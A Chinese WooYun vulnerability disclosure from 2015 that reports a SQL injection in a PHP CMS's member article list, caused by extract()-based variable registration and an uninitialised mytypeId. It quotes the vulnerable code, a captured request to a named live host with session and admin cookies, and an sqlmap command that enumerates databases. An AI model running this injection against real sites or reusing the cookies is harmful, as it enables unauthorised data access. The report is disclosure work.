wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-04-09：	细节已通知厂商并且等待厂商处理中									2015-04-13：	厂商已经确认，细节仅向厂商公开									2015-04-16：	细节向第三方安全合作伙伴开放									2015-06-07：	细节向核心白帽子及相关领域专家公开									2015-06-17：	细节向普通白帽子公开									2015-06-27：	细节向实习白帽子公开									2015-07-12：	细节向公众公开  简要描述： rt 详细说明：  首先看到global.inc.php
$magic_quotes_gpc = get_magic_quotes_gpc( );@extract( @daddslashes( @$_COOKIE ) );@extract( @daddslashes( @$_POST ) );@extract( @daddslashes( @$_GET ) );if ( $magic_quotes_gpc ){    $_FILES = daddslashes( $_FILES );}
伪全局变量注册看到\library\module\memcp\article_list.php
if ( empty( $step ) ){    $mytypeId_cond = "";    if ( empty( $mytypeId ) )    {        $mytypeId_cond = " and mytypeId=".$mytypeId." ";    }    $sql_query = "SELECT `id` , `name` , `systypeId` , `mytypeId` , `status` , `sys_status` , `sort` , `uid` , `count` , `type` , `content` , `createtime`  ,(SELECT `name` FROM `".$tablepre."logtype` WHERE `type`=0 and id=a.mytypeId)  as typename FROM `{$tablepre}article` a WHERE `uid`='{$vicworl_uid}' and `type`='0' {$mytypeId_cond}  ORDER BY `createtime` DESC";    $sql_count = "SELECT count(*)  FROM `".$tablepre."article`      WHERE `uid`='{$vicworl_uid}' and `type`='0' {$mytypeId_cond}         ";    $page = new pdo_page( );    $page_size = 20;    $link_num = 6;    $pagestr = "?action=article_list&";    $page->set( $db, $sql_query, $sql_count, $page_size, $link_num, $pagestr );    $page->create_page( );    $page_data = $page->get( 0 );    $page_show = $page->get( 1 );    if ( 0 < $page->get( 2 ) )    {        $i = 0;        for ( ; $i < count( $page_data ); ++$i )        {            $page_data[$i]['createtime'] = date( $format_datetime, $page_data[$i]['createtime'] );        }    }    $page_data = htmlsc( $page_data );    $page_show( "page_show", @$page_show );    $page_data( "allRows", @$page_data );    $tpl->display( $theme."memcp/article_list.html" );}
其中mytypeId未初始化，造成注入。首先抓包
GET /memcp.php?action=article_list&mytypeId=* HTTP/1.1Host: ntzx.cnProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8Cookie: VisitNum=2; _gscu_465476474=27948242hdqtdg95; DSSESSID=31j9v1knuv25c1dgrer0lm4gs2; admin_silicpass=b51dbe0573b8f04d4962a764f9b8fb94; vicworl_auth=DrZa6VmT%2Fm41wUVwf80CVokjwwarNj5AIO00eJ2EiTCHaAU95ASRHIFHsdcKeJnLFlo
然后
C:\Users\A>sqlmap.py -r C:\Users\A\Desktop\4.txt --risk 3 --dbms=MySQL --dbs --delay=2
